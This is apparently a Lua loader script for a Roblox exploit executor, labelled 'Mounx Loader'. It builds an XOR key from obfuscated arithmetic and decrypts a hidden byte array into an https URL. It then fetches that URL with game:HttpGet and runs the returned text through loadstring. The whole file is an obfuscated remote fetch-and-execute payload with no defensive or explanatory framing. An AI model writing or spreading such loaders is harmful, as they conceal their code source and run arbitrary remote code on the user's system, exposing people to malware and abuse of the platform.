-- Mounx Loader
-- Protected by Mounx Security Layer v4
local _s,_c,_b,_x,_tc=string,string.char,string.byte,bit32.bxor,table.concat
local _g=game

-- Key derivation
local __vhkp={}
__vhkp[9]=_c(83-34)
__vhkp[5]=_c(bit32.bxor(159,0xAB))
__vhkp[8]=_c(80+27)
__vhkp[10]=_c(31+26)
__vhkp[3]=_c(bit32.bxor(156,0xAB))
__vhkp[1]=_c(20+57)
__vhkp[6]=_c(bit32.bxor(156,0xAB))
__vhkp[11]=_c(43+13)
__vhkp[4]=_c(bit32.bxor(153,0xAB))
__vhkp[2]=_c(bit32.bxor(211,0xAB))
__vhkp[7]=_c(11+79)
__vhkp=_tc(__vhkp)

-- Payload
local _zuldo={37,12,67,66,71,13,117,68,92}
local __vbgehc={86,77,35,0,71,83,90,82,54}
local ___haxbv={69,94,87,74,40,22,83,87,70}
local __fryr={25,57,4,92,22,89,61,17,24}
local _wggg={94,91,86,62,14,67,22,72,56}
local _ijwpz={26,91,91,87}

-- Assemble
local ___ssfhuk={}
for _i=1,#_zuldo do ___ssfhuk[#___ssfhuk+1]=_zuldo[_i] end
for _i=1,#__vbgehc do ___ssfhuk[#___ssfhuk+1]=__vbgehc[_i] end
for _i=1,#___haxbv do ___ssfhuk[#___ssfhuk+1]=___haxbv[_i] end
for _i=1,#__fryr do ___ssfhuk[#___ssfhuk+1]=__fryr[_i] end
for _i=1,#_wggg do ___ssfhuk[#___ssfhuk+1]=_wggg[_i] end
for _i=1,#_ijwpz do ___ssfhuk[#___ssfhuk+1]=_ijwpz[_i] end

-- Decrypt
local ___nzw={}
for _i=1,#___ssfhuk do
    ___nzw[_i]=_c(_x(___ssfhuk[_i],_b(__vhkp,((_i-1)%#__vhkp)+1)))
end
___nzw=_tc(___nzw)

-- Execute
local ___wuw=_g["HttpGet"](_g,___nzw)
if type(___wuw)=="string" and #___wuw>0 then
    local _babzw=(loadstring or load)(___wuw)
    if _babzw then _babzw() end
end
